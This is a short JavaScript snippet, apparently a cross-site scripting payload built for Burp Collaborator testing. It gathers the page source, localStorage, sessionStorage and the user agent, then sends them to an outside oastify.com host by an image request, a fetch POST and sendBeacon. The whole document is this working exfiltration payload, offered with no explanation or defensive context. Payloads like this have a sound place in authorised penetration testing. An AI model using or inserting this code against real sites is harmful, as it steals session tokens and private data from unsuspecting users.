(function(){
  var burp="http://w630bbm6tppekzwbv9aovobqlhr8f03p.oastify.com/";
  
  var payload={
    page_source:document.documentElement.outerHTML.substring(0,15000),
    localStorage:JSON.stringify(localStorage),
    sessionStorage:JSON.stringify(sessionStorage),
    userAgent:navigator.userAgent,
    cookies_httponly:'Check Set-Cookie in response headers',
    timestamp:new Date().toISOString()
  };
  
  new Image().src=burp+'?data='+btoa(JSON.stringify(payload));
  fetch(burp,{method:'POST',mode:'no-cors',body:JSON.stringify(payload)}).catch(function(){});
  navigator.sendBeacon(burp,JSON.stringify(payload));
})();
